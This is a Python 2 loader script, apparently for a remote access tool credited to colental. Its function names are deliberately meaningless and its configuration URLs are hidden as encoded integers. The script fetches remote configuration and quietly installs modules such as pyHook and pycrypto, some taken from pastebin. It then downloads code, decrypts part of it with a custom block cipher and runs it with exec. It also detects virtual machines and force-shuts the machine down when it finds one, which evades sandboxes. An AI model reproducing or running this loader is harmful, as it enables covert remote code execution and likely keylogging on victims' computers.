#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""
 
 
        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
        ,adPPPPP88 88       88 8b       88 88	        8b       88
        88,    ,88 88       88 "8a,   ,d88 88	        "8a,   ,d88
        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
                                aa,    ,88 	         aa,    ,88
                                 "Y8bbdP"                 "Y8bbdP'

                                                       88                          ,d
                                                       88                          88
         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
        8PP8888888 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
                    aa,    ,88  aa,    ,88 88                                      "Y888
                     "Y8bbdP"    "Y8bbdP"  88



                            https://github.com/colental/ae
"""

from __future__ import print_function
import os
import sys
import imp
import json
import time
import struct
import base64
import urllib




def main(*args, **kwargs):
    
    def QuadraticFungalLegend(data, key):
        data    = base64.b64decode(data)
        blocks  = [data[i * 8:((i + 1) * 8)] for i in range(len(data) // 8)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            u,v = struct.unpack("!2L", block)
            k   = struct.unpack("!4L", key)
            d,m = 0x9e3779b9L, 0xffffffffL
            sum = (d * 32) & m
            for _ in range(32):
                v   = (v - (((u << 4 ^ u >> 5) + u) ^ (sum + k[sum >> 11 & 3]))) & m
                sum = (sum - d) & m
                u   = (u - (((v << 4 ^ v >> 5) + v) ^ (sum + k[sum & 3]))) & m
            packed  = struct.pack("!2L", u, v)
            output  = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
            vector  = block
            result.append(output)
        return ''.join(result).rstrip(chr(0))
        
    def CrystallineSluggishAnatomy(*args, **kwargs):
        IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
        SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
        RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
        GroovySophisticatedLemur  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
        AccidentalAquaticCat      = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
        if '__file__' in globals():
            AccidentalAquaticCat['f'] = bytes(IncontinentObtuseCucumber(__file__))
        if not len(GroovySophisticatedLemur):
            if os.name is 'nt':
                exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
                exec SomberUnbecomingAmusement(AccidentalAquaticCat.get('l')) in globals()
        else:
            try:
                os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
                OrganicFecalOrigin = json.loads(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat['t'])).read()).get(os.name).get(str(struct.calcsize('P') * 8))
                for FoamyNonstopHistory, NobleRusticWalrus in OrganicFecalOrigin.items():
                    if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                        RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                        if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                            if 'pastebin' not in NobleRusticWalrus:
                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                            else:
                                if 'pyHook' in FoamyNonstopHistory:
                                    ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
                                    with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                        fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                                    if os.path.isfile(ZonkedEnthusiasticTadpole):
                                        os.remove(ZonkedEnthusiasticTadpole)
                                elif 'pypiwin32' in FoamyNonstopHistory:
                                    ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
                                    with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                        fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                                    SilkyPerilousManifesto  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
                                    if os.path.isfile(SilkyPerilousManifesto):
                                        RuthlessSpiffyTablecloth([SilkyPerilousManifesto, '-install'])
                                    if os.path.isfile(ZonkedEnthusiasticTadpole):
                                        os.remove(ZonkedEnthusiasticTadpole)
                                elif 'pycrypto' in FoamyNonstopHistory:
                                    ZonkedEnthusiasticTadpole = 'pycrypto-2.6.1-cp27-none-win_amd64.whl'
                                    with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                        fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                                    if os.path.isfile(ZonkedEnthusiasticTadpole):
                                        os.remove(ZonkedEnthusiasticTadpole)
            except Exception as e:
                if _debug:
                    print("Launch error: {}".format(str(e)))
            finally:
                return AccidentalAquaticCat                
    
    if kwargs.get('checkvm'):
        check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
        check_procs   = [i.split()[0 if os.name is 'nt' else -1] for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
        if len(check_environ + check_procs):
            if not _debug:
                if os.name is 'nt':
                    _ = os.popen('taskkill /pid %d' % os.getpid()).read()
                    _ = os.popen('shutdown /p /f').read()                 
                else:
                    _ = os.popen('kill -9 %d' % os.getpid()).read()
                    _ = os.popen('shutdown --poweroff --no-wall').read()

    if kwargs.get('config'):
        AccidentalAquaticCat        = CrystallineSluggishAnatomy(**kwargs)
        SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % x)).strip('0x').strip('L')))
        pkgs     = 'from __future__ import print_function\n'
        if 'z' in AccidentalAquaticCat:
            head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
            head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
            foot = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()
            foot = base64.b64decode(foot)
            body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
            body = QuadraticFungalLegend(body, foot)
            pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
        else:
            head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
            head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
            body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
            pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
        payload  = '\n\n\n'.join([pkgs, body, head])
        exec(payload) in globals()


if __name__ == '__main__':
    if '--debug' in sys.argv:
        _debug = True
    else:
        _debug = False
    main(config=81126388790932157784)

     